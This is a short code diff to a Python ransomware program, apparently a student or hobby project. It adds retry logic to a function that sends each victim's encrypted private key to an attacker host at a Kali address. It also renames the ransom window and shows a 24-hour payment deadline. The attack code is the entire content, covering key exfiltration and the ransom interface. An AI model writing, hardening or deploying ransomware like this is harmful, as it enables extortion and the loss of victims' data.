@@ -356,7 +356,21 @@ def sendkeys(computer_id):
     encrypted_private_key = encrypt_data(private_key)
 
     endpoint_url = f"http://{kali_address}/saveprivatekey"
-    response = requests.post(endpoint_url, json={'computer_id': computer_id, 'encrypted_private_key': encrypted_private_key})
+    retries = 5  # 
+    for attempt in range(retries):
+        try:
+            response = requests.post(endpoint_url, json={'computer_id': computer_id, 'encrypted_private_key': encrypted_private_key})
+            if response.status_code == 200:
+                print("Private key sent successfully.")
+                break
+            else:
+                print(f"Failed to send private key. Status code: {response.status_code}")
+        except requests.exceptions.ConnectionError as e:
+            print(f"Attempt {attempt + 1}/{retries} - Connection error: {e}")
+            if attempt < retries - 1:
+                time.sleep(5)
+            else:
+                print("All retries failed. Exiting.")
 
 def info(computer_id):
     try:
@@ -504,7 +518,7 @@ class App(customtkinter.CTk):
         self.wm_iconbitmap()
         self.iconphoto(False, self.iconpath)
         self.resizable(False, False)
-        self.title("SPR708 Ransomware.py")
+        self.title("Sufian Ransomware.py")
         self.geometry(f"{1400}x{800}")
         self.deadline = datetime.now() + timedelta(hours=24)  # Initialize deadline here
         self.clock_stopped = False  # Add clock stopped flag
